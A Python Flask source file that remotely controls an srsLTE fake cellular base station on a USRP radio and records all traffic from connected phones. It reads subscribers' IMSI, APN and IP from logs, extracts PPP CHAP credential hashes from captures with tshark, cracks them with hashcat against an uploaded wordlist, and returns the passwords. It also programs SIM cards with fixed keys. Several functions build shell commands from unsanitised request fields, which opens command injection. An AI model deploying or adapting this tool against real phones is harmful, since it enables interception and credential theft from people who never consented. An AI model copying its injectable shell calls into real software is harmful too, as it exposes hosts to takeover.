from crypt import methods
import os
import json
import subprocess
from unittest import result
from flask import Flask, request, send_file

app = Flask(__name__)
@app.route('/start', methods={"POST"})
def start():
    conf = request.get_data()
    json_conf = json.loads(conf)
    band = json_conf.get("band")
    apn = json_conf.get("apn")
    mcc = json_conf.get("mcc")
    mnc = json_conf.get("mnc")
    network = json_conf.get("network")
    result = start_srsLTE(band, apn, mcc, mnc, network)
    return result

@app.route('/stop', methods=["POST"])
def stop():
    result = stop_srsLTE()
    return result

@app.route('/basicinfo', methods=["POST"])
def basicInfo():
    result = getBasicInfo()
    return result

@app.route('/crackapn', methods=["POST"])
def crackapn():
    result = startCrackAPN()
    return result

@app.route('/getcrackresult', methods=["POST"])
def getcrackresult():
    result = getCrackResult()
    return result

@app.route('/userupload', methods=["POST"])
def userUpload():
    status = False
    message_id = 0 # 0 -> upload failed  1 -> upload success  2 -> no file
    message = "upload Failed"
    userfile = request.files['userdb']
    if userfile is None:
        message_id = 2
        message = "no file"
    else:
        upload_path = os.getcwd() + "/conf/user_db.csv"
        userfile.save(upload_path)
        status = True
        message_id = 1
        message = "upload success"
    result = {'status': status, 'message_id': message_id, 'message': message}
    json_result = json.dumps(result)
    print(json_result)
    return json_result

@app.route('/passwordupload', methods=["POST"])
def passwordUpload():
    status = False
    message_id = 0 # 0 -> upload failed  1 -> upload success  2 -> no file
    message = "upload Failed"
    worldlistfile = request.files['wordlist']
    if worldlistfile is None:
        message_id = 2
        message = "no file"
    else:
        upload_path = os.getcwd() + "/wordlist.list"
        worldlistfile.save(upload_path)
        status = True
        message_id = 1
        message = "upload success"
    result = {'status': status, 'message_id': message_id, 'message': message}
    json_result = json.dumps(result)
    print(json_result)
    return json_result

@app.route('/getfile', methods=["POST"])
def getfile():
    conf = request.get_data()
    json_conf = json.loads(conf)
    fileid = json_conf.get("fileid")
    result, file_path = get_file(fileid)
    print(result)
    if file_path is None:
        return result
    else:
        return send_file(file_path, as_attachment=True)

@app.route('/writesim', methods=["POST"])
def writesim():
    conf = request.get_data()
    json_conf = json.loads(conf)
    imsi = json_conf.get("imsi")
    print(imsi)
    result = doWriteUsim(imsi)
    print(result)
    return result


########################################################
def start_srsLTE(band, apn, mcc, mnc, network):
    ### default start failed
    status = False
    message_id = 0
    # 0 -> start failed  1 -> start success  2 -> is running    3 -> Incomplete parameters    
    # 4 -> device is not connected, please connect usrp device.    5 -> System is started, but packet capture failed.
    message = "Start Failed"
    # Determine whether the device is connect
    ps_command_resault = os.popen("ps -aux | grep -v 'grep' | grep srs").read()
    if(len(ps_command_resault) == 0):
        # Determine whether the parameters are complete.
        if(len(band) <= 0 or len(apn) <= 0 or len(mcc) <= 0 or len(mnc) <= 0 or len(network) <= 0):
            message_id = 3
            message = "Incomplete parameters"
        else:
            # Determine whether it is running.
            if(usrpConnect()):
                current_path = os.getcwd()
                # start_command = "bash " + current_path + "/run.sh" + " " + band + " " + apn + " " + mcc + " " + mnc + " " + network
                # os.system(start_command)
                # # Waitting for srsLTE start 
                # os.system("sleep 3")
                subprocess.call(["bash", current_path+"/run.sh", band, apn, mcc, mnc,network])
                ps_command_resault = os.popen("ps -aux | grep -v 'grep' | grep srs").read()
                # Determine whether the program is started
                if(len(ps_command_resault) != 0):
                    tcpdump_command = "nohup tcpdump -i " + network + " -w /home/workspace/log/lte_data.pcap &"
                    os.system(tcpdump_command)
                    tcpdump_command_result = os.popen("ps -aux | grep -v 'grep' | grep tcpdump").read()
                    if(len(tcpdump_command_result) != 0):
                        status = True
                        message_id = 1
                        message = "Start successfully"
                    else:
                        status = False
                        message_id = 5
                        message = "System is started, but packet capture failed."                 
            else:
                message_id = 4
                message = "device is not connected, please connect usrp device."
    else:
        message_id = 2
        message = "is running"

    result = {'status': status, "message_id": message_id, "message": message}
    result_json = json.dumps(result)
    print(result_json)
    return result_json

def stop_srsLTE():
    status = False
    message_id = 0 # 0 -> stop failed   1 -> stop success   2 -> not running
    message = "Stop failed."
    ps_command_resault = os.popen("ps -aux | grep -v 'grep' | grep srs").read()
    if(len(ps_command_resault) == 0):
        message_id = 2
        message = "Not running."
    else:
        current_path = os.getcwd()
        # stop_command = "bash " + current_path + "/stop.sh"
        # os.system(stop_command)
        # # Waitting for srsLTE stop.
        # os.system("sleep 3")
        subprocess.call(["bash", current_path+"/stop.sh"])
        os.system("sleep 3")
        ps_command_result = os.popen("ps -aux | grep -v 'grep' | grep srs").read() # srslte kill result
        ps_command_result_2 = os.popen("ps -aux | grep -v 'grep' | grep tcpdump").read() # tcpdump kill result
        print(ps_command_result)
        print(ps_command_result_2)
        if(len(ps_command_result) == 0 and len(ps_command_result_2) == 0):
            status = True
            message_id = 1
            message = "Stop successfully."
    result = {'status': status, "message_id": message_id, "message": message}
    result_json = json.dumps(result)
    print(result_json)
    return result_json

def getBasicInfo():
    status = False
    message_id = 0  # 0 -> Failed   1 -> Getting information success    2 -> Is not running, please start first    3 -> no UE connected
    message = "Failed"
    apn = None
    imsi = None
    ip = None
    current_path = os.getcwd()
    epc_log_path = current_path + "/log/srsLTE_epc.log"
    ps_command_resault = os.popen("ps -aux | grep -v 'grep' | grep srs").read()
    # Determine whether the program is started
    if(len(ps_command_resault) <= 0): # not start
        message_id = 2
        message = "Is not running, please start first."
    else:
        apn_info = os.popen("cat " + epc_log_path + " | grep 'ESM Info: APN'").read()
        imsi_info = os.popen("cat " + epc_log_path + " | grep 'Found User'").read()
        ip_info = os.popen("cat " + epc_log_path + " | grep 'get_new_ue_ipv4 pool ip addr'").read()
        if(len(apn_info) > 0 and len(imsi_info) > 0 and len(ip_info) > 0):
            status = True
            message_id = 1
            message = "Getting information success."
            apn = apn_info.split()[-1]
            imsi = imsi_info.split()[-1]
            ip = ip_info.split()[-1]
        else:
            message_id = 3
            message = "no UE connected"
    result = {'status': status, 'message_id': message_id, 'message': message, 'apn': apn, 'imsi': imsi, 'ip': ip}
    result_json = json.dumps(result)
    print(result_json)
    return result_json

def getAllInfo():
    status = 0    
    # 0 -> Failed.    
    # 1 -> Success.    
    # 2 -> Can not get username and password.    
    # 3 -> Stop srslte failed.
    # 4 -> Can not get UE's data, please start first and connect UE, or just connect UE. Then try again.
    apn = None
    imsi = None
    ip = None
    username = None
    hash_pass = None
    current_path = os.getcwd()
    # log & conf path
    epc_log_path = current_path + "/log/srsLTE_epc.log"
    s1ap_path = current_path + '/log/srsLTE_enb_s1ap.pcap'
    # get apn,imsi and ip from srsLTE_epc.log
    apn_info = os.popen("cat " + epc_log_path + " | grep 'ESM Info: APN'").read()
    imsi_info = os.popen("cat " + epc_log_path + " | grep 'Found User'").read()
    ip_info = os.popen("cat " + epc_log_path + " | grep 'get_new_ue_ipv4 pool ip addr'").read()
    # apn,imsi & ip can't be empty
    if(len(apn_info) > 0 and len(imsi_info) > 0 and len(ip_info) > 0):
        # stop srsLTE
        stop_result = stop_srsLTE()
        json_stop_result = json.loads(stop_result)
        # The peogram must be stop before get all information.
        if(json_stop_result.get("status") or json_stop_result.get("message_id") == 2):   
            apn = apn_info.split()[-1] # get apn
            imsi = imsi_info.split()[-1] # get imsi
            ip = ip_info.split()[-1] #get ip
            # use tshark to parse srsLTE_enb_s1ap.pcap, to get username,password
            tshark_command = "tshark -o \"uat:user_dlts:\\\"User 3 (DLT=150)\\\",\\\"s1ap\\\",\\\"0\\\",\\\"\\\",\\\"0\\\",\\\"\\\"\" -r " + s1ap_path + " -Y \"chap\" -V 2>&1 | grep -A 7 \"PPP Challenge Handshake\" "
            tshark_result = os.popen(tshark_command).read()
            # if tshark has data
            if(len(tshark_result) > 0):
                info = tshark_result.split()
                # get identifer
                response_identifer = info[9]
                if(len(response_identifer) == 1): response_identifer = "0" + response_identifer
                chap_challenge_value = info[17] # get challenge value
                chap_response_value = info[38] # get response value
                username = info[19] # get UE's username
                hash_pass = chap_response_value + ":" + chap_challenge_value + ":" + response_identifer # splicing to get hash
                status = 1
            else:
                status = 2
        else:
            status = 3
    else:
        status = 4
    return status, apn, imsi, ip, username, hash_pass

def startCrackAPN():
    status = False
    # 0 -> Failed.
    # 1 -> Start crack success.  
    # 2 -> Hashcat is running.
    # 3 -> Can not get UE's data, please start first and connect UE, or just connect UE. Then try again.    
    # 4 -> Can not get username and password 
    # 5 -> Stop program failed, please try to stop manually.
    message_id = 0 
    message = "Failed"
    ps_hashcat = os.popen("ps aux | grep -v 'grep' | grep hashcat").read()
    if(len(ps_hashcat) >= 0):
        current_path = os.getcwd()
        wordlist_path = current_path + '/wordlist.list'
        info_status, apn, imsi, ip, username, hash_pass = getAllInfo()
        if info_status == 1:
            # Starting using hask to crack password
            print(username + "\n" + hash_pass)
            os.popen("hashcat -m 4800 -a 0 " + str(hash_pass) + " " + wordlist_path + " --force 2>&1 >> " + current_path + "/log/hashcat.log")
            status = True
            message_id = 1
            message = "Start crack success."
        elif info_status == 2:
            message_id = 4
            message = "Can not get username and password"
        elif info_status == 3:
            message_id = 5
            message = "Stop program failed, please try to stop manually."
        elif info_status == 4:
            message_id = 3
            message = "Can not get UE's data, please start first and connect UE, or just connect UE. Then try again."
    else:
        message_id = 2
        message = "Hashcat is running."
    result = {"status": status, "message_id": message_id, "message": message}
    result_json = json.dumps(result)
    print(result_json)
    return result_json

def getCrackResult():
    status = False
    message_id = 0 
    # 0 -> Failed.
    # 1 -> Getting information success.
    # 2 -> Cracking apn is still running, please try again later.
    # 3 -> Can not get password from the dict.
    # 4 -> Can not get username and password.
    # 5 -> Can not get UE's data, please start first and connect UE, or just connect UE, then try again.
    # 6 -> Stop program failed, please try to stop manually.
    message = "Failed."
    apn = None
    imsi = None
    ip = None
    username = None
    hash_pass = None
    password = None

    ps_hashcat = os.popen("ps aux | grep -v 'grep' | grep hashcat").read()
    if(len(ps_hashcat) > 0):
        message_id = 2
        message = "Cracking apn is still running, please try again later."
    else:
        current_path = os.getcwd()
        wordlist_path = current_path + '/wordlist.list'
        info_status, apn, imsi, ip, username, hash_pass = getAllInfo()
        if info_status == 1:
            # Try to read
            print(username + "\n" + hash_pass)
            pass_result = os.popen("hashcat -m 4800 -a 0 " + str(hash_pass) + " " + wordlist_path + " --show").read()
            if(len(pass_result) > 0):
                status = True
                message_id = 1
                message = "Getting information success."
                password = pass_result.split(":")[-1][:-1]
            else:
                message_id = 3
                message = "Can not get password from dict."
        elif info_status == 2:
            message_id = 4
            message = "Can not get username and password."
        elif info_status == 3:
            message_id = 6
            message = "Stop program failed, please try to stop manually."
        elif info_status == 4:
            message_id = 5
            message = "Can not get UE's data, please start first and connect UE, or just connect UE. Then try again."

    result = {"status": status, "message_id": message_id, "message": message, 'apn': apn, 'imsi': imsi, 'ip': ip, "username": username, "password": password}
    result_json = json.dumps(result)
    print(result_json)
    return result_json

def get_file(fileid):
    status = False
    message_id = 0 # 0 -> Failed    1 -> Succeed    2 -> Error id    3 -> Can not find the file.
    message = "Failed"
    file_path = None
    id_to_name = {
        0 : "lte_data.pcap",
        1 : "srsLTE_enb_s1ap.pcap",
        2 : "srsLTE_enb.pcap",
        3 : "srsLTE_epc.pcap"
    }
    if fileid < 0 or fileid > 3:
        message_id = 2
        message = "Error id"
    else:
        log_path = "/home/workspace/log/"
        file_path = log_path + id_to_name.get(fileid)
        print(file_path)
        is_exists = os.path.exists(file_path)
        if is_exists:
            status = True
            message_id = 1
            message = "Succeed"
        else:
            message_id = 2
            message = "Can not find the file"
            file_path = None

    result = {"status": status, "message_id": message_id, "message": message}
    result_json = json.dumps(result)
    print(result_json)
    return result_json, file_path

def doWriteUsim(imsi):
    status = False
    # 0 -> Failed    
    # 1 -> Succeed    
    # 2 -> Device is not connected, please connect acr1281 first.    
    # 3 -> Writting card successfully, but write user_db.csv failed.
    # 4 -> The card already exists and can be used directly.
    # 5 -> SIM card is not inserted.
    message_id = 0 
    message = "Failed"
    card_connect_result = cardConnect()
    if(card_connect_result == 1):
        print("ACR1281 and card connect success.")
        # Check pcscd service,if pcscd service is not start, restart it.
        pcscd_result = os.popen("ps aux | grep -v 'grep' | grep pcscd").read()
        if(len(pcscd_result) <= 0):
            os.popen("service pcscd restart 2>&1").read()
        current_path = os.getcwd()
        # Start write sim card
        write_command = "python3 " + current_path + "/pysim/pySim-prog.py -p 0  -x "+ imsi[0:3] + " -y " + imsi[3:5] + " -i " + imsi + " -s 89860123456789012345 -o 63bfa50ee6523365ff14c1f45f88737d  -k 00112233445566778899aabbccddeeff -n LTESystem -A 3030303030303030 --acc FFFF -t testsim"
        write_result = os.popen(write_command).read()
        # If the card is written successfully,try to read the card to verify thr result.
        if "Programming successful" in write_result:
            print("Writting successfully. Starting to read the card.")
            read_command = "python3 " + current_path + "/pysim/pySim-read.py -p 0"
            read_result = os.popen(read_command).read()
            if imsi in read_result:
                print("Validation succeeded. Starting to write data to user_db.csv.")
                addUser_result = addUser(imsi)
                print(addUser_result)
                if(addUser_result == 1):
                    message_id = 1
                    message = "Succeed."
                elif(addUser_result == 2):
                    message_id = 4
                    message = "The card already exists and can be used directly."
                else:
                    message_id = 3
                    message = "Writting card successfully, but write user_db.csv failed."
    elif(card_connect_result == 2):
        message_id = 5
        message = "SIM card is not inserted."
    else:
        message_id = 2
        message = "Device is not connected, please connect acr1281 first."


    result = {"status": status, "message_id": message_id, "message": message}
    result_json = json.dumps(result)
    print(result_json)
    return result_json

def usrpConnect():
    status = False # default not connect
    devices_status = os.popen("uhd_find_devices 2>&1 | grep B210").read()
    if(len(devices_status) > 0):
        status = True
    return status

def cardConnect():
    status = 0    # 0 -> Failed.    1 -> Succeed.    2    Device is connected, but SIM card is not inserted.
    device_status = os.popen("lsusb 2>&1 | grep ACR1281").read()
    if(len(device_status) > 0):
        print("ACR1281 connect succeed.")
        current_path = os.getcwd()
        read_command = "python3 " + current_path + "/pysim/pySim-read.py -p 0 > " + current_path + "/log/pySimRead.log &"
        os.popen(read_command)
        os.system("sleep 2")
        ps_read_result = os.popen("ps aux | grep -v 'grep' | grep pySim-read | awk '{print $2}'").read()
        read_log_command = "cat " + current_path + "/log/pySimRead.log | grep 'Reading ...'"
        read_result = os.popen(read_log_command).read()
        if len(read_result) > 0:
            status = 1
        else:  
            print("kill " + ps_read_result)
            os.popen("kill " + ps_read_result)
            status = 2
    return status

def addUser(imsi):
    result = 0    # 0 -> False    1 -> Success    2 -> Card already exists.
    current_path = os.getcwd()
    user_db_path = current_path + "/conf/user_db.csv"
    # load user_db.csv
    user_db_all = os.popen("cat " + user_db_path).read()
    # Delete note to get the user data
    user_data_lists = user_db_all[1738:].split("\n")[1:-1]
    data_num = len(user_data_lists)

    if imsi in user_db_all:
        result = 2
    else:
        data_name = "ue" + str(data_num)
        insert_user_data = data_name + ",mil," + imsi + ",00112233445566778899aabbccddeeff,opc,63bfa50ee6523365ff14c1f45f88737d,8001,000000001234,7,dynamic"
        insert_command = "echo '" + insert_user_data + "' >> " + user_db_path
        os.popen(insert_command)
        #check
        user_db_all = os.popen("cat " + user_db_path).read()
        if imsi in user_db_all:
            result = 1
    return result

if __name__=="__main__":
    app.run(host='0.0.0.0', port=8081, debug=True)
